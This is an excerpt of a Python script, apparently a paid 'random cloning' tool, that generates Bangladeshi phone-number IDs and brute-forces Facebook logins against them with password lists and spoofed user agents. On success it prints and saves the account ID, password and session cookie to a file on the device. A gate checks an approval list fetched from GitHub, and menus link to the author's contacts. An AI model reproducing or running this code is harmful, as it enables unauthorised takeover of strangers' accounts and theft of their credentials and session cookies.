...
logo=("""
      \x1b[1;90m╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
       ...
       \x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: SHAHARIAR ZAMAN
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mshahariar001M
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mPREMIUM
\x1b[1;36m{+} \x1b[1;97mTOOL VERSION      \x1b[1;97m: \x1b[1;92m0.1
\033[1;96m═════════════════════════════════════════════
""")
...
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;37m😍\33[1;92m][\033[1;93mA\33[1;92m] START RANDOM CLONING")
	print("[\033[1;37m🌹\33[1;92m][\033[1;93mB\33[1;92m] CONTACT ADMIN")
	print("[\033[1;37m✅\33[1;92m][\033[1;93mC\33[1;92m] FOLLOW MY FB PROFILE")
	print("[\033[1;37m😀\33[1;92m][\033[1;93mD\33[1;92m] JOIN MESSENGER GROUP")
	print('[\033[1;37m◀️\33[1;92m][\033[1;93mE\33[1;92m] EXIT PROGRAMMING')
	print(54*'━')
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/Innocent.DR4G0N.HACKER');time.sleep(1)
		fb()
	if opt in ["D","4"]:
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801867468585');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/INNOCENTDR4G0N');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/shaharia001M');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	os.system('clear')
	print(logo)
	print(" ┏━[•] BD SIM CODE 017 018 019 016 015 013]")
	kode = input(' ┗━[+] SELECT : ')
	...
	print(' [💉] Ids saved in ᴀʟɪᴠᴇ.txt,ＤΞΛＤ.txt')
	print(50*'_')
	exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝗦𝗘𝗔𝗥𝗖𝗛𝗜𝗡𝗚-🔍\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro,
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [ᴀʟɪᴠᴇ🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/ᴀʟɪᴠᴇ.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/shahariar001M/Approval/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am a ROBOT and my boss is Shahariar Zaman.Sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,press Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://m.facebook.com/messages/t/Innocent.DR4G0N.HACKER")
        superuser()        
superuser()
